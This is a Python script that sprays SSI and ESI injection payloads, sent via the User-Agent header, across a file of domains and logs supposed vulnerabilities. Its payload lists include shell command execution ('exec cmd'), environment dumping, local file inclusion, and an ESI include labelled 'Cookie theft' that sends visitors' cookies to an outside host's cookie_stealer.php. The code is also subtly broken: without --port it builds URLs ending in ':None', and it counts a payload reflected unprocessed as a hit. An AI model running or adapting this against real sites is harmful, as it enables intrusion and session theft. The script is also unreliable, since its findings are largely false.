import requests
from requests.exceptions import RequestException
import argparse

# Load domains from the input file
def load_domains(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f.readlines() if line.strip()]

# Function to log detected vulnerabilities
def log_vulnerability(domain, vulnerability, payload, output_file):
    with open(output_file, 'a') as log:
        log.write(f"[{domain}] Potential {vulnerability} vulnerability detected using payload: {payload}\n")

# Function to test SSI vulnerabilities
def test_ssi_vulnerabilities(domain, output_file):
    ssi_payloads = [
        "<!--#echo var=\"DOCUMENT_NAME\" -->",             # Document name
        "<!--#echo var=\"DATE_LOCAL\" -->",                # Date inclusion
        "<!--#include virtual=\"/cgi-bin/counter.pl\" -->",# CGI program results
        "<!--#flastmod file=\"index.html\" -->",           # Modification date of a file
        "<!--#exec cmd=\"ls\" -->",                        # Command exec (ls)
        "<!--#printenv -->",                               # Print environment variables
        "<!--#set var=\"name\" value=\"Rich\" -->"         # Setting variables
    ]
    
    for payload in ssi_payloads:
        try:
            response = requests.get(domain, headers={"User-Agent": payload}, timeout=5)
            if response.status_code == 200 and payload in response.text:
                print(f"Potential SSI vulnerability detected at {domain} using payload: {payload}")
                log_vulnerability(domain, "SSI", payload, output_file)
            else:
                print(f"No SSI vulnerability detected with payload: {payload}")
        except RequestException as e:
            print(f"Error testing SSI at {domain}: {e}")

# Function to test ESI vulnerabilities
def test_esi_vulnerabilities(domain, output_file):
    esi_payloads = [
        "hell<!--esi-->o",                                # Basic detection
        "<esi:include src=http://alejandro.com/>",          # External include
        "<esi:include src=http://alejandro.com/?cookie_stealer.php?=$(HTTP_COOKIE)>",  # Cookie theft
        "<esi:include src=\"supersecret.txt\">",          # Include local file
        "<esi:debug/>",                                   # Debugging information
    ]
    for payload in esi_payloads:
        try:
            response = requests.get(domain, headers={"User-Agent": payload}, timeout=5)
            if response.status_code == 200 and payload in response.text:
                print(f"Potential ESI vulnerability detected at {domain} using payload: {payload}")
                log_vulnerability(domain, "ESI", payload, output_file)
            else:
                print(f"No ESI vulnerability detected with payload: {payload}")
        except RequestException as e:
            print(f"Error testing ESI at {domain}: {e}")

# Function to prepare the full URL based on domain, protocol, and port
def prepare_url(domain, port):
    if domain.startswith("https://"):
        return f"https://{domain[8:]}:{port}" if port != 443 else domain
    elif domain.startswith("http://"):
        return f"http://{domain[7:]}:{port}" if port != 80 else domain
    else:
        # Default to HTTPS if no protocol is provided
        return f"https://{domain}:{port}" if port != 443 else f"https://{domain}"

# Main function to test all domains in the input file
def main():
    parser = argparse.ArgumentParser(description="Test domains for SSI and ESI vulnerabilities.")
    parser.add_argument('--input', type=str, default='live_subdomains.txt', help="Input file containing domain list")
    parser.add_argument('--output', type=str, default='ssi_esi.log', help="Output file to log vulnerabilities")
    parser.add_argument('--port', type=int, help="Port number to use for testing (default: 443)")
    
    args = parser.parse_args()

    domains = load_domains(args.input)
    for domain in domains:
        full_url = prepare_url(domain, args.port)
        print(f"\nTesting {full_url} for SSI vulnerabilities...")
        test_ssi_vulnerabilities(full_url, args.output)
        print(f"Testing {full_url} for ESI vulnerabilities...")
        test_esi_vulnerabilities(full_url, args.output)

if __name__ == "__main__":
    main()
